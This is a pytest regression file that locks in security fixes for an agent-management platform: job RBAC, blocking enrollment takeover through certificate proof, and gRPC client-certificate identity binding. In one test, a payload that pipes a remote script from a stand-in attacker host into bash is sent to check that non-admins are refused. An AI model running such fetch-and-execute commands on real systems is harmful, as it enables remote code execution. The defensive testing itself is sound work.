"""Security regression tests — docs/security/SECURITY_AUDIT.md CR-01/HI-01/CR-03.

These lock in the P0 fixes; removing any guard here must fail CI.
"""

import uuid
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import grpc
import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
from httpx import AsyncClient

# ── helpers ───────────────────────────────────────────────────────────────────

async def _make_agent(db_session, **overrides):
    from lokilinux.models.agent import Agent, AgentStatus

    agent = Agent(
        agent_id=overrides.pop("agent_id", str(uuid.uuid4())),
        status=overrides.pop("status", AgentStatus.ACTIVE),
        hostname=overrides.pop("hostname", f"host-{uuid.uuid4().hex[:8]}"),
        **overrides,
    )
    db_session.add(agent)
    await db_session.flush()
    return agent


def _make_ca(tmp_path):
    """Generate a real CA (ca.crt/ca.key) in tmp_path — mirrors prod layout."""
    from lokilinux.config import get_settings  # noqa: F401 — ensure module loaded

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "LokiLinux Test CA"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "LokiLinux"),
    ])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + timedelta(days=365))
        .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
        .sign(key, hashes.SHA256())
    )
    cert_dir = tmp_path / "certs"
    cert_dir.mkdir(exist_ok=True)
    (cert_dir / "ca.key").write_bytes(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ))
    (cert_dir / "ca.crt").write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    return cert_dir, key, cert


def _issue_agent_cert(ca_key, ca_cert, agent_id, *, days=365):
    """Mint an agent-style client cert (CN=agent_id, EKU clientAuth)."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    now = datetime.now(timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, agent_id),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "LokiLinux"),
        ]))
        .issuer_name(ca_cert.subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]),
            critical=False,
        )
    )
    if days >= 0:
        builder = builder.not_valid_before(now).not_valid_after(now + timedelta(days=days))
    else:
        # expired window entirely in the past
        builder = (
            builder.not_valid_before(now - timedelta(days=10))
            .not_valid_after(now + timedelta(days=days))
        )
    cert = builder.sign(ca_key, hashes.SHA256())
    return cert.public_bytes(serialization.Encoding.PEM).decode()


# ── CR-01 · jobs RBAC ─────────────────────────────────────────────────────────

@pytest.mark.asyncio
@pytest.mark.parametrize("job_type", ["CUSTOM_COMMAND", "ANSIBLE_PLAYBOOK"])
async def test_host_mutating_jobs_reject_non_admin(
    client: AsyncClient, db_session, current_user, job_type
):
    """VIEWER/OPERATOR must never create arbitrary-execution jobs (CR-01)."""
    agent = await _make_agent(db_session)
    await db_session.commit()

    for role in ("VIEWER", "OPERATOR", "AUDITOR"):
        current_user["role"] = role
        resp = await client.post("/api/v1/jobs", json={
            "name": "sneaky",
            "job_type": job_type,
            "target_servers": {"agent_ids": [str(agent.id)]},
            "parameters": {"command": "curl evil.sh | bash"},
        })
        assert resp.status_code == 403, f"{role} must be rejected for {job_type}"


@pytest.mark.asyncio
async def test_custom_command_admin_requires_approval_and_is_audited(
    client: AsyncClient, db_session, current_user
):
    """ADMIN may create CUSTOM_COMMAND but approval is forced + audited."""
    current_user["role"] = "ADMIN"
    agent = await _make_agent(db_session)
    await db_session.commit()

    resp = await client.post("/api/v1/jobs", json={
        "name": "legit fix",
        "job_type": "CUSTOM_COMMAND",
        "target_servers": {"agent_ids": [str(agent.id)]},
        "parameters": {"command": "systemctl restart nginx"},
    })
    assert resp.status_code == 201
    body = resp.json()
    assert body["requires_approval"] is True

    # audit entry exists for the sensitive creation
    from sqlalchemy import select

    from lokilinux.models.audit import AuditLog

    row = (
        await db_session.execute(
            select(AuditLog)
            .where(AuditLog.action == "job.created_host_mutating")
            .where(AuditLog.resource_id == body["id"])
        )
    ).scalars().first()
    assert row is not None


@pytest.mark.asyncio
async def test_service_forces_approval_regardless_of_caller(
    db_session, fake_cache, fake_nats
):
    """Defense-in-depth: even internal callers cannot bypass the approval gate."""
    from lokilinux.services.job_service import JobService

    agent_a = await _make_agent(db_session)
    agent_b = await _make_agent(db_session)
    await db_session.commit()

    svc = JobService(db_session, fake_cache, fake_nats)
    job = await svc.create_job(
        name="internal bypass attempt",
        job_type="CUSTOM_COMMAND",
        target_servers={"agent_ids": [str(agent_a.id)]},
        parameters={"command": "id"},
        requires_approval=False,
    )
    assert job.requires_approval is True

    benign = await svc.create_job(
        name="inventory",
        job_type="INVENTORY_SCAN",
        target_servers={"agent_ids": [str(agent_b.id)]},
        requires_approval=False,
    )
    assert benign.requires_approval is False


# ── HI-01 · enrollment takeover ───────────────────────────────────────────────

@pytest.fixture
def patched_cert_dir(monkeypatch, tmp_path):
    cert_dir, ca_key, ca_cert = _make_ca(tmp_path)
    cfg = SimpleNamespace(agent_cert_dir=str(cert_dir))
    monkeypatch.setattr(
        "lokilinux.api.v1.routers.agent_install.get_settings", lambda: cfg
    )
    return cert_dir, ca_key, ca_cert


async def _enroll(client, hostname, *, extra=None):
    payload = {
        "hostname": hostname,
        "os_distro": "ubuntu",
        "os_version": "24.04",
        "arch": "amd64",
    }
    payload.update(extra or {})
    return await client.post(
        "/api/v1/agents/register",
        json=payload,
        headers={"Authorization": "Bearer test-enrollment-token"},
    )


@pytest.mark.asyncio
async def test_register_new_hostname_succeeds(client, db_session, fake_cache, patched_cert_dir):
    await db_session.commit()
    fake_cache._store["enrollment:test-enrollment-token"] = True
    resp = await _enroll(client, f"fresh-{uuid.uuid4().hex[:6]}")
    assert resp.status_code == 200
    body = resp.json()
    assert body["agent_id"]
    assert body["agent_cert"].startswith("-----BEGIN CERTIFICATE-----")


@pytest.mark.asyncio
async def test_hostname_takeover_blocked_without_proof(
    client, db_session, fake_cache, patched_cert_dir, current_user
):
    current_user["role"] = "ADMIN"
    agent = await _make_agent(db_session)
    await db_session.commit()

    fake_cache._store["enrollment:test-enrollment-token"] = True
    resp = await _enroll(client, agent.hostname)
    assert resp.status_code == 409


@pytest.mark.asyncio
async def test_hostname_takeover_blocked_with_wrong_cert(
    client, db_session, fake_cache, patched_cert_dir, current_user
):
    """A valid CA cert for a DIFFERENT agent_id proves nothing — still blocked."""
    current_user["role"] = "ADMIN"
    _, ca_key, ca_cert = patched_cert_dir
    agent = await _make_agent(db_session)
    await db_session.commit()

    fake_cache._store["enrollment:test-enrollment-token"] = True
    # valid CA signature, but CN belongs to a DIFFERENT agent_id
    other_pem = _issue_agent_cert(ca_key, ca_cert, str(uuid.uuid4()))
    resp = await _enroll(client, agent.hostname, extra={"existing_cert_pem": other_pem})
    assert resp.status_code == 409


@pytest.mark.asyncio
async def test_reenrollment_with_valid_proof_rotates_identity(
    client, db_session, fake_cache, patched_cert_dir, current_user
):
    """Holder of the current cert MAY rotate credentials (proof-of-possession)."""
    _, ca_key, ca_cert = patched_cert_dir
    agent = await _make_agent(db_session)
    await db_session.commit()

    fake_cache._store["enrollment:test-enrollment-token"] = True
    proof = _issue_agent_cert(ca_key, ca_cert, agent.agent_id)
    resp = await _enroll(client, agent.hostname, extra={"existing_cert_pem": proof})
    assert resp.status_code == 200
    assert resp.json()["agent_id"] == str(agent.agent_id)


@pytest.mark.asyncio
async def test_reenrollment_with_expired_cert_blocked(
    client, db_session, fake_cache, patched_cert_dir
):
    _, ca_key, ca_cert = patched_cert_dir
    agent = await _make_agent(db_session)
    await db_session.commit()

    fake_cache._store["enrollment:test-enrollment-token"] = True
    expired = _issue_agent_cert(ca_key, ca_cert, agent.agent_id, days=-5)
    resp = await _enroll(client, agent.hostname, extra={"existing_cert_pem": expired})
    assert resp.status_code == 409


# ── CR-03 · gRPC identity binding ─────────────────────────────────────────────

class AbortError(Exception):
    def __init__(self, status, message):
        self.status = status
        self.message = message


class _StubContext:
    def __init__(self, pem=None):
        self._pem = pem
        self.aborted = None

    def auth_context(self):
        if self._pem is None:
            return {}
        return {"x509_pem_cert": [self._pem]}

    async def abort(self, status, message):
        raise AbortError(status, message)


class _RecordingFactory:
    """Async-context-manager standing in for the session factory — records
    whether control flow got past the identity gate (which runs before it)."""

    def __init__(self):
        self.entered = False

    def __call__(self):
        return self

    async def __aenter__(self):
        self.entered = True
        return None

    async def __aexit__(self, *exc):
        return False


async def _run_stream(servicer, request_agent_id, ctx):
    from types import SimpleNamespace

    async def req_iter():
        yield SimpleNamespace(agent_id=request_agent_id)

    async for _ in servicer.HeartbeatStream(req_iter(), ctx):
        pass


@pytest.mark.asyncio
async def test_grpc_rejects_missing_client_cert(fake_cache):
    from lokilinux.api.grpc.agent_service import AgentServicer

    servicer = AgentServicer(db_factory=None, cache=fake_cache, nats=None)
    with pytest.raises(AbortError) as ei:
        await _run_stream(servicer, str(uuid.uuid4()), _StubContext(pem=None))
    assert ei.value.status == grpc.StatusCode.UNAUTHENTICATED


@pytest.mark.asyncio
async def test_grpc_rejects_agent_id_mismatch(fake_cache, patched_cert_dir):
    """Cert says agent A, wire claims agent B → UNAUTHENTICATED before any DB hit."""
    from lokilinux.api.grpc.agent_service import AgentServicer

    _, ca_key, ca_cert = patched_cert_dir
    real_id = str(uuid.uuid4())
    pem = _issue_agent_cert(ca_key, ca_cert, real_id)

    servicer = AgentServicer(db_factory=None, cache=fake_cache, nats=None)
    with pytest.raises(AbortError) as ei:
        await _run_stream(servicer, str(uuid.uuid4()), _StubContext(pem=pem))
    assert ei.value.status == grpc.StatusCode.UNAUTHENTICATED


@pytest.mark.asyncio
async def test_grpc_accepts_matching_identity_before_db(fake_cache, patched_cert_dir):
    """Matched identity passes the gate — control flow reaches db_factory.

    The stream's generic except swallows downstream errors by design, so we
    prove gate passage via the recording factory, not via exception type.
    """
    from lokilinux.api.grpc.agent_service import AgentServicer

    _, ca_key, ca_cert = patched_cert_dir
    agent_id = str(uuid.uuid4())
    pem = _issue_agent_cert(ca_key, ca_cert, agent_id)

    factory = _RecordingFactory()
    servicer = AgentServicer(db_factory=factory, cache=fake_cache, nats=None)
    await _run_stream(servicer, agent_id, _StubContext(pem=pem))
    assert factory.entered is True


@pytest.mark.asyncio
async def test_revoked_agent_rejected_at_gate(fake_cache, patched_cert_dir):
    from lokilinux.api.grpc.agent_service import AgentServicer, revoke_agent_identity

    _, ca_key, ca_cert = patched_cert_dir
    agent_id = str(uuid.uuid4())
    pem = _issue_agent_cert(ca_key, ca_cert, agent_id)

    await revoke_agent_identity(fake_cache, agent_id)

    servicer = AgentServicer(db_factory=None, cache=fake_cache, nats=None)
    with pytest.raises(AbortError) as ei:
        await _run_stream(servicer, agent_id, _StubContext(pem=pem))
    assert ei.value.status == grpc.StatusCode.PERMISSION_DENIED
